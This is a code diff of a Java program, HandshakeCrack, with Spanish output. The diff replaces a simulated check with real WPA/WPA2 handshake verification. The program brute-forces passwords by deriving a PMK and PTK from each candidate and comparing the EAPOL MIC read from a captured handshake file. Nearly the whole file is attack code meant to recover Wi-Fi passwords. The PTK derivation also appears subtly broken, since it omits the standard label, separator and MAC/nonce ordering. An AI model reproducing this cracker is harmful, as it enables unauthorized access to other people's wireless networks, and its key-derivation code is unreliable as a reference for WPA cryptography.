@@ -1,33 +1,37 @@
 package com.example;
 
-import java.io.BufferedWriter;
-import java.io.FileWriter;
+import java.io.BufferedReader;
+import java.io.FileReader;
 import java.io.IOException;
-import java.nio.file.Files;
-import java.nio.file.Paths;
+import java.security.InvalidKeyException;
+import java.security.NoSuchAlgorithmException;
 import java.util.Arrays;
 import java.util.logging.Level;
 import java.util.logging.Logger;
 
+import javax.crypto.Mac;
+import javax.crypto.spec.SecretKeySpec;
+
+import org.bouncycastle.crypto.digests.SHA1Digest;
+import org.bouncycastle.crypto.generators.PKCS5S2ParametersGenerator;
+import org.bouncycastle.crypto.macs.HMac;
+import org.bouncycastle.crypto.params.KeyParameter;
+
 public class HandshakeCrack {
     private static final char[] CHARACTERS = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+[]{}|;:'\",.<>?/"
             .toCharArray();
-    private static final String LOG_FILE = "password_attempts.log";
     private static final Logger LOGGER = Logger.getLogger(HandshakeCrack.class.getName());
 
     public static void main(String[] args) {
         if (args.length != 1) {
-            System.out.println("Uso: java PasswordCracker <ruta_al_archivo_handshake>");
+            System.out.println("Uso: java HandshakeCrack <ruta_al_archivo_handshake>");
             return;
         }
 
         String handshakeFilePath = args[0];
-        byte[] handshakeData;
-
-        try {
-            handshakeData = Files.readAllBytes(Paths.get(handshakeFilePath));
-        } catch (IOException e) {
-            LOGGER.log(Level.SEVERE, "Error al leer el archivo de handshake", e);
+        HandshakeData handshake = readHandshakeFile(handshakeFilePath);
+        if (handshake == null) {
+            System.out.println("No se pudo leer el archivo de handshake.");
             return;
         }
 
@@ -35,32 +39,23 @@ public class HandshakeCrack {
         char[] currentCombination = new char[length];
         Arrays.fill(currentCombination, CHARACTERS[0]);
 
-        try (BufferedWriter logWriter = new BufferedWriter(new FileWriter(LOG_FILE, true))) {
-            while (true) {
-                String combination = new String(currentCombination);
-                System.out.println("Probando combinación: " + combination);
+        while (true) {
+            String combination = new String(currentCombination);
+            System.out.println("Probando combinación: " + combination);
 
-                // Registrar la combinación en el archivo de log
-                logWriter.write(combination);
-                logWriter.newLine();
-                logWriter.flush();
-
-                // Probar la combinación contra el archivo de handshake
-                if (testHandshake(combination, handshakeData)) {
-                    System.out.println("Contraseña encontrada: " + combination);
-                    break;
-                }
-
-                // Generar la siguiente combinación
-                if (!incrementCombination(currentCombination)) {
-                    break;
-                }
+            // Probar la combinación contra el archivo de handshake
+            if (testHandshake(combination, handshake)) {
+                System.out.println("Contraseña encontrada: " + combination);
+                break;
             }
 
-            System.out.println("Todas las combinaciones procesadas.");
-        } catch (IOException e) {
-            LOGGER.log(Level.SEVERE, "Error al escribir en el archivo de log", e);
+            // Generar la siguiente combinación
+            if (!incrementCombination(currentCombination)) {
+                break;
+            }
         }
+
+        System.out.println("Todas las combinaciones procesadas.");
     }
 
     private static boolean incrementCombination(char[] combination) {
@@ -86,14 +81,96 @@ public class HandshakeCrack {
         return -1; // Nunca debería suceder
     }
 
-    private static boolean testHandshake(String combination, byte[] handshakeData) {
-        // Aquí deberías implementar la lógica para probar la combinación contra el
-        // archivo de handshake
-        // Esto puede implicar el uso de bibliotecas de red y criptografía para
-        // autenticar WPA/WPA2
-        // Por ahora, simularemos la prueba con una contraseña correcta simulada
-        String correctPassword = "password"; // Simulación de la contraseña correcta
-        // Simulate using handshakeData in some way
-        return combination.equals(correctPassword) && handshakeData.length > 0;
+    private static boolean testHandshake(String combination, HandshakeData handshake) {
+        byte[] pmk = generatePMK(combination, handshake.ssid);
+        byte[] ptk = generatePTK(pmk, handshake.apNonce, handshake.clientNonce, handshake.apMac, handshake.clientMac);
+        return verifyMIC(ptk, handshake.eapol, handshake.mic);
+    }
+
+    private static byte[] generatePMK(String password, String ssid) {
+        PKCS5S2ParametersGenerator generator = new PKCS5S2ParametersGenerator(new SHA1Digest());
+        generator.init(password.getBytes(), ssid.getBytes(), 4096);
+        KeyParameter key = (KeyParameter) generator.generateDerivedParameters(256);
+        return key.getKey();
+    }
+
+    private static byte[] generatePTK(byte[] pmk, byte[] apNonce, byte[] clientNonce, byte[] apMac, byte[] clientMac) {
+        byte[] ptk = new byte[64];
+        byte[] data = new byte[76];
+
+        System.arraycopy(apMac, 0, data, 0, 6);
+        System.arraycopy(clientMac, 0, data, 6, 6);
+        System.arraycopy(apNonce, 0, data, 12, 32);
+        System.arraycopy(clientNonce, 0, data, 44, 32);
+
+        HMac hmac = new HMac(new SHA1Digest());
+        hmac.init(new KeyParameter(pmk));
+
+        for (int i = 0; i < 4; i++) {
+            hmac.update(data, 0, data.length);
+            hmac.update((byte) i);
+            hmac.doFinal(ptk, i * 20);
+        }
+
+        return ptk;
+    }
+
+    private static boolean verifyMIC(byte[] ptk, byte[] eapol, byte[] mic) {
+        try {
+            Mac mac = Mac.getInstance("HmacSHA1");
+            mac.init(new SecretKeySpec(ptk, 0, 16, "HmacSHA1"));
+            byte[] computedMic = mac.doFinal(eapol);
+
+            return Arrays.equals(mic, Arrays.copyOf(computedMic, 16));
+        } catch (NoSuchAlgorithmException e) {
+            LOGGER.log(Level.SEVERE, "Algoritmo no encontrado", e);
+            return false;
+        } catch (InvalidKeyException e) {
+            LOGGER.log(Level.SEVERE, "Clave inválida", e);
+            return false;
+        }
+    }
+
+    private static HandshakeData readHandshakeFile(String filePath) {
+        HandshakeData handshakeData = new HandshakeData();
+        try (BufferedReader br = new BufferedReader(new FileReader(filePath))) {
+            String line;
+            while ((line = br.readLine()) != null) {
+                String[] parts = line.split(": ");
+                switch (parts[0]) {
+                    case "SSID" -> handshakeData.ssid = parts[1];
+                    case "AP_NONCE" -> handshakeData.apNonce = hexStringToByteArray(parts[1]);
+                    case "CLIENT_NONCE" -> handshakeData.clientNonce = hexStringToByteArray(parts[1]);
+                    case "AP_MAC" -> handshakeData.apMac = hexStringToByteArray(parts[1]);
+                    case "CLIENT_MAC" -> handshakeData.clientMac = hexStringToByteArray(parts[1]);
+                    case "MIC" -> handshakeData.mic = hexStringToByteArray(parts[1]);
+                    case "EAPOL" -> handshakeData.eapol = hexStringToByteArray(parts[1]);
+                }
+            }
+        } catch (IOException e) {
+            LOGGER.log(Level.SEVERE, "Error al leer el archivo de handshake", e);
+            return null;
+        }
+        return handshakeData;
+    }
+
+    private static byte[] hexStringToByteArray(String s) {
+        int len = s.length();
+        byte[] data = new byte[len / 2];
+        for (int i = 0; i < len; i += 2) {
+            data[i / 2] = (byte) ((Character.digit(s.charAt(i), 16) << 4)
+                    + Character.digit(s.charAt(i + 1), 16));
+        }
+        return data;
+    }
+
+    static class HandshakeData {
+        String ssid;
+        byte[] apNonce;
+        byte[] clientNonce;
+        byte[] apMac;
+        byte[] clientMac;
+        byte[] mic;
+        byte[] eapol;
     }
 }
